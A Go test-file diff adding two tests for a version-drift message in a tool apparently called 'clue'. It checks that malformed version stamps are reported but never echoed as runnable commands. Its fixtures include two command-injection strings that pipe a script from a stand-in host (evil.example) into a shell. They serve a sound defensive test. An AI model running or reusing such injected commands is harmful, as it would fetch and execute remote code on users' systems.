@@ -223,6 +223,79 @@ func TestAC033_DevMatchingAndUnmarkedSkillsDoNotDrift(t *testing.T) {
 	}
 }
 
+// TestAC079_UnitPositive_DriftNamesTheWayOutAndTheWayToStay reads the message
+// itself: the old wording stated the disagreement and left the reader to guess
+// which side to move (ADR-042).
+func TestAC079_UnitPositive_DriftNamesTheWayOutAndTheWayToStay(t *testing.T) {
+	root := t.TempDir()
+	writeSkill(t, root, "clue-delta", markedSkill("0.11.2"))
+	issues := checkSkillVersions(&Corpus{Root: root}, "0.12.0")
+	if len(issues) != 1 {
+		t.Fatalf("expected exactly the drift issue, got %v", issues)
+	}
+	msg := issues[0].Msg
+	for _, want := range []string{
+		"0.11.2", "0.12.0", // both versions, as before
+		`"clue latest"`,       // what reports the upgrade
+		`"clue migrate"`,      // what moves the repository
+		"install clue 0.11.2", // the binary for staying where you are
+		"clue-version=0.11.2", // and the caller pin that keeps CI on it
+	} {
+		if !strings.Contains(msg, want) {
+			t.Fatalf("expected %q in the drift message, got %q", want, msg)
+		}
+	}
+}
+
+// TestAC079_UnitNegative_TheRuleItselfIsUnchanged holds the other direction:
+// what the message says changed, not what the rule decides.
+func TestAC079_UnitNegative_TheRuleItselfIsUnchanged(t *testing.T) {
+	root := t.TempDir()
+	writeSkill(t, root, "clue-delta", markedSkill("0.11.2"))
+	if issues := checkSkillVersions(&Corpus{Root: root}, "0.11.2"); len(issues) != 0 {
+		t.Fatalf("a matching release must stay silent, got %v", issues)
+	}
+	if anyMsg(checkSkillVersions(&Corpus{Root: root}, "dev"), "clue latest") {
+		t.Fatal("a dev build has no release to drift from and must say nothing")
+	}
+	// The half that names things to run repeats a string the corpus supplies,
+	// so it is written only for a stamp that is three plain numbers. A stamp
+	// carrying anything else is still reported — as the fact it is, never as an
+	// instruction to paste.
+	// Each of these fails the gate for a different reason, so no single half of
+	// it can be removed and stay green: too many dot-separated parts, exactly
+	// three parts that are not all digits, too few parts, and an empty part.
+	// (A two-part stamp cannot appear here — the frontmatter reader rejects
+	// "0.11" earlier, as a YAML float rather than a version string.)
+	for _, stamp := range []string{
+		"0.11.2 && curl http://evil.example/p.sh | sh",
+		"0.11.2; curl http://evil.example/p.sh | sh",
+		"0.11.2-rc1",
+		"garbage",
+		"0..2",
+		"0.11.2.3", // all digits, wrong count: only the length gate refuses it
+		"v0.11.2",
+	} {
+		odd := t.TempDir()
+		writeSkill(t, odd, "clue-delta", markedSkill(stamp))
+		issues := checkSkillVersions(&Corpus{Root: odd}, "0.12.0")
+		if len(issues) != 1 || !strings.Contains(issues[0].Msg, "drift") {
+			t.Fatalf("%q: an odd stamp still drifts, got %v", stamp, issues)
+		}
+		msg := issues[0].Msg
+		if !strings.Contains(msg, stamp) || !strings.Contains(msg, "0.12.0") {
+			t.Fatalf("%q: the drift must still name both versions, got %q", stamp, msg)
+		}
+		// The half shaped as things to run is written only from a stamp that is
+		// three plain numbers (ADR-042).
+		for _, forbidden := range []string{"install clue " + stamp, "clue-version="} {
+			if strings.Contains(msg, forbidden) {
+				t.Fatalf("%q: a stamp that is not three numbers was written as a command: %q", stamp, msg)
+			}
+		}
+	}
+}
+
 // AC-037: a manifest named SKILL.md joins the managed set exactly as a
 // lowercase skill.md would, so the verdict does not depend on the host
 // filesystem. The drift finding names the actual manifest file, which the
